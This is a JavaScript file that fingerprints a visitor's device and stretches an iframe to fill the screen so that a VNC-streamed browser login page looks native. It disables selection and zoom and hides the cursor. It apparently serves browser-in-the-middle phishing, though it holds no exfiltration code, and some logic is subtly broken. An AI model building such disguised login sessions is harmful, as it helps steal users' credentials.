// Perfect VNC UI Manager for Chromium Browser Login Pages
// This script ensures the VNC connection perfectly matches the client's UI

class VNCUIManager {
    constructor() {
        this.screenData = null;
        this.isMobile = false;
        this.targetUrl = null;
        this.vncPassword = null;
        this.init();
    }
    
    init() {
        this.detectEnvironment();
        this.createPerfectUI();
        this.setupEventListeners();
        this.logEnvironmentInfo();
    }
    
    detectEnvironment() {
        // Get comprehensive screen and device information
        this.screenData = {
            // Screen dimensions
            width: screen.width,
            height: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            
            // Window dimensions
            windowWidth: window.innerWidth,
            windowHeight: window.innerHeight,
            
            // Device characteristics
            pixelRatio: window.devicePixelRatio || 1,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            
            // Mobile detection
            isMobile: /iPhone|iPad|iPod|Android|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
            isIOS: /iPad|iPhone|iPod/.test(navigator.userAgent),
            isAndroid: /Android/.test(navigator.userAgent),
            
            // Screen orientation
            orientation: screen.orientation ? screen.orientation.type : 'unknown',
            angle: screen.orientation ? screen.orientation.angle : 0,
            
            // Browser capabilities
            supportsTouch: 'ontouchstart' in window,
            supportsPointer: 'PointerEvent' in window,
            
            // Fullscreen status
            isFullscreen: (window.innerWidth === screen.width && window.innerHeight === screen.height),
            
            // User agent
            userAgent: navigator.userAgent,
            
            // Platform
            platform: navigator.platform,
            
            // Language
            language: navigator.language,
            
            // Screen time
            timestamp: Date.now()
        };
        
        // Detect if this is mobile based on viewport size and device type
        this.isMobile = this.screenData.isMobile || 
                       (this.screenData.width < 768 && this.screenData.height < 1024);
    }
    
    createPerfectUI() {
        const iframe = document.getElementById('myIframe');
        const body = document.body;
        const html = document.documentElement;
        
        // Reset all styles to ensure perfect matching
        this.resetStyles(html, body);
        
        // Set exact screen dimensions
        this.setExactDimensions(html, body, iframe);
        
        // Apply device-specific optimizations
        this.applyDeviceOptimizations(iframe);
        
        // Handle mobile-specific requirements
        if (this.isMobile) {
            this.applyMobileOptimizations(body, iframe);
        }
        
        // Apply desktop-specific requirements
        if (!this.isMobile) {
            this.applyDesktopOptimizations(body, iframe);
        }
        
        // Ensure perfect login page display
        this.ensurePerfectLoginPageDisplay(iframe);
    }
    
    resetStyles(html, body) {
        // Reset HTML element
        html.style.width = this.screenData.width + 'px';
        html.style.height = this.screenData.height + 'px';
        html.style.overflow = 'hidden';
        html.style.margin = '0';
        html.style.padding = '0';
        html.style.border = 'none';
        html.style.boxSizing = 'border-box';
        
        // Reset body element
        body.style.width = this.screenData.width + 'px';
        body.style.height = this.screenData.height + 'px';
        body.style.overflow = 'hidden';
        body.style.margin = '0';
        body.style.padding = '0';
        body.style.background = '#ffffff';
        body.style.boxSizing = 'border-box';
        
        // Remove any default browser styles
        body.style.webkitUserSelect = 'none';
        body.style.mozUserSelect = 'none';
        body.style.msUserSelect = 'none';
        body.style.userSelect = 'none';
    }
    
    setExactDimensions(html, body, iframe) {
        // Set exact screen dimensions for perfect matching
        const dimensions = {
            html: {
                width: this.screenData.width + 'px',
                height: this.screenData.height + 'px'
            },
            body: {
                width: this.screenData.width + 'px',
                height: this.screenData.height + 'px'
            },
            iframe: {
                width: this.screenData.width + 'px',
                height: this.screenData.height + 'px'
            }
        };
        
        // Apply dimensions
        Object.keys(dimensions).forEach(element => {
            if (element === 'iframe') {
                iframe.style.width = dimensions[element].width;
                iframe.style.height = dimensions[element].height;
            } else {
                document[element].style.width = dimensions[element].width;
                document[element].style.height = dimensions[element].height;
            }
        });
        
        // Position iframe absolutely
        iframe.style.position = 'absolute';
        iframe.style.top = '0';
        iframe.style.left = '0';
        iframe.style.border = 'none';
        iframe.style.margin = '0';
        iframe.style.padding = '0';
    }
    
    applyDeviceOptimizations(iframe) {
        // Handle high DPI displays
        if (this.screenData.pixelRatio > 1) {
            iframe.style.transform = `scale(${this.screenData.pixelRatio})`;
            iframe.style.transformOrigin = 'top left';
            iframe.style.width = (this.screenData.width / this.screenData.pixelRatio) + 'px';
            iframe.style.height = (this.screenData.height / this.screenData.pixelRatio) + 'px';
        }
        
        // Handle color depth
        if (this.screenData.colorDepth < 24) {
            iframe.style.imageRendering = 'optimizeSpeed';
        }
    }
    
    applyMobileOptimizations(body, iframe) {
        // Mobile-specific optimizations
        body.style.touchAction = 'manipulation';
        body.style.webkitTapHighlightColor = 'transparent';
        body.style.webkitUserSelect = 'none';
        body.style.mozUserSelect = 'none';
        body.style.msUserSelect = 'none';
        body.style.userSelect = 'none';
        
        // Prevent zooming on mobile
        body.style.touchAction = 'none';
        body.style.webkitTouchCallout = 'none';
        body.style.webkitUserSelect = 'none';
        body.style.khtmlUserSelect = 'none';
        body.style.mozUserSelect = 'none';
        body.style.msUserSelect = 'none';
        body.userSelect = 'none';
        
        // Handle mobile orientation
        if (this.screenData.orientation && this.screenData.orientation.includes('landscape')) {
            body.style.transform = 'rotate(90deg)';
            body.style.transformOrigin = 'center center';
            body.style.width = this.screenData.height + 'px';
            body.style.height = this.screenData.width + 'px';
        }
    }
    
    applyDesktopOptimizations(body, iframe) {
        // Desktop-specific optimizations
        body.style.cursor = 'default';
        body.style.webkitUserSelect = 'none';
        body.style.mozUserSelect = 'none';
        body.style.msUserSelect = 'none';
        body.style.userSelect = 'none';
        
        // Handle desktop fullscreen
        if (this.screenData.isFullscreen) {
            body.style.cursor = 'none';
        }
    }
    
    ensurePerfectLoginPageDisplay(iframe) {
        // Ensure the login page is displayed perfectly
        iframe.style.boxShadow = 'none';
        iframe.style.borderRadius = '0';
        iframe.style.opacity = '1';
        iframe.style.visibility = 'visible';
        iframe.style.display = 'block';
        
        // Remove any scrollbars
        iframe.style.overflow = 'hidden';
        
        // Ensure the iframe loads immediately
        iframe.style.transition = 'none';
        iframe.style.animation = 'none';
    }
    
    setupEventListeners() {
        // Handle window resize
        let resizeTimeout;
        window.addEventListener('resize', () => {
            clearTimeout(resizeTimeout);
            resizeTimeout = setTimeout(() => {
                this.handleResize();
            }, 100);
        });
        
        // Handle orientation change
        window.addEventListener('orientationchange', () => {
            setTimeout(() => {
                this.handleOrientationChange();
            }, 100);
        });
        
        // Handle visibility change
        document.addEventListener('visibilitychange', () => {
            this.handleVisibilityChange();
        });
        
        // Handle page unload
        window.addEventListener('beforeunload', () => {
            this.handleBeforeUnload();
        });
    }
    
    handleResize() {
        // Update screen data on resize
        this.screenData.windowWidth = window.innerWidth;
        this.screenData.windowHeight = window.innerHeight;
        this.screenData.isFullscreen = (window.innerWidth === screen.width && window.innerHeight === screen.height);
        
        console.log('Window resized:', this.screenData.windowWidth + 'x' + this.screenData.windowHeight);
        
        // Recreate UI if dimensions changed significantly
        if (Math.abs(this.screenData.windowWidth - window.innerWidth) > 10 || 
            Math.abs(this.screenData.windowHeight - window.innerHeight) > 10) {
            this.createPerfectUI();
        }
    }
    
    handleOrientationChange() {
        this.screenData.orientation = screen.orientation ? screen.orientation.type : 'unknown';
        this.screenData.angle = screen.orientation ? screen.orientation.angle : 0;
        
        console.log('Orientation changed:', this.screenData.orientation);
        
        // Recreate UI for new orientation
        this.createPerfectUI();
    }
    
    handleVisibilityChange() {
        if (document.hidden) {
            console.log('Page hidden - VNC session paused');
        } else {
            console.log('Page visible - VNC session resumed');
            this.createPerfectUI();
        }
    }
    
    handleBeforeUnload() {
        console.log('VNC UI Session ended:', this.screenData.width + 'x' + this.screenData.height);
        console.log('Session duration:', Date.now() - this.screenData.timestamp + 'ms');
    }
    
    logEnvironmentInfo() {
        console.log('=== PERFECT VNC UI MANAGER INITIALIZED ===');
        console.log('Device:', this.isMobile ? 'Mobile' : 'Desktop');
        console.log('Screen:', this.screenData.width + 'x' + this.screenData.height);
        console.log('Available:', this.screenData.availWidth + 'x' + this.screenData.availHeight);
        console.log('Window:', this.screenData.windowWidth + 'x' + this.screenData.windowHeight);
        console.log('Pixel Ratio:', this.screenData.pixelRatio);
        console.log('Orientation:', this.screenData.orientation);
        console.log('Color Depth:', this.screenData.colorDepth + 'bpp');
        console.log('Touch Support:', this.screenData.supportsTouch);
        console.log('Fullscreen:', this.screenData.isFullscreen);
        console.log('User Agent:', this.screenData.userAgent);
        console.log('Platform:', this.screenData.platform);
        console.log('Language:', this.screenData.language);
        console.log('============================================');
    }
}

// Initialize the VNC UI Manager when the page loads
document.addEventListener('DOMContentLoaded', function() {
    window.vncUIManager = new VNCUIManager();
});

// Fallback for older browsers
window.onload = function() {
    if (!window.vncUIManager) {
        window.vncUIManager = new VNCUIManager();
    }
};